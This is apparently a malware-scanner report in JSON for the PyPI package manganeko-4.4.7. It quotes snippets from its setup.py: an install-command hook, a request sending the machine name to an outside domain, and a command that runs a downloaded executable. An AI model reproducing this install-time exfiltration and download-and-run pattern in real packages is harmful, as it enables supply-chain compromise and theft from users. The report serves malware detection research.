{
  "package_name": "manganeko-4.4.7",
  "total_matches": 3,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/manganeko-4.4.7/manganeko-4.4.7/setup.py",
      "file_name": "setup.py",
      "detection_count": 3,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code exhibits multiple strong indicators of malicious behavior, consistent with known supply chain attacks and Python malware. Specifically: (1) It collects sensitive system information (the COMPUTERNAME environment variable) and exfiltrates it to an external, suspicious domain (https://linkedopports.com/pyp/resp.php) without user consent or notification. (2) It downloads a Windows executable (https://python-release.com/python-install.scr) and writes it to disk as 'ini_file_pyp_32.exe', then immediately executes it via os.system('start '+filename), again without user interaction or validation. (3) All of this is triggered automatically during the package installation process by hijacking the setuptools install command via the PostInstallCommand class and the cmdclass argument in setup(). (4) The code uses a try/except block to suppress errors and avoid detection. (5) The package metadata (name, description) is generic and misleading, and there is no legitimate application logic. These patterns are strongly associated with malware, especially supply chain attacks via malicious PyPI packages, and there are no benign use cases for this combination of behaviors.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "16",
          "type_description": "code-execution: found 1 source code matches",
          "code_snippet": "os.system('start '+filename)",
          "full_match": "* This package is executing OS commands in the setup.py file at manganeko-4.4.7/setup.py:16",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/manganeko-4.4.7/manganeko-4.4.7/setup.py",
          "relative_path": "manganeko-4.4.7/setup.py"
        },
        {
          "line_number": "10",
          "type_description": "exfiltrate-sensitive-data: found 1 source code matches",
          "code_snippet": "t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)",
          "full_match": "* This package is exfiltrating sensitive data to a remote server at manganeko-4.4.7/setup.py:10",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/manganeko-4.4.7/manganeko-4.4.7/setup.py",
          "relative_path": "manganeko-4.4.7/setup.py"
        },
        {
          "line_number": "26",
          "type_description": "cmd-overwrite: found 1 source code matches",
          "code_snippet": "setup(\nname='manganeko',\nversion='4.4.7',\ndescription='A very basic firstbasicpyapp',\npython_requires=\">=3.6\",\ninstall_requires=[''],\ntests_require=[],\ncmdclass={'install': PostInstallCommand},\n)",
          "full_match": "* This package is overwriting the 'install' command in setup.py at manganeko-4.4.7/setup.py:26",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/manganeko-4.4.7/manganeko-4.4.7/setup.py",
          "relative_path": "manganeko-4.4.7/setup.py"
        }
      ]
    }
  ]
}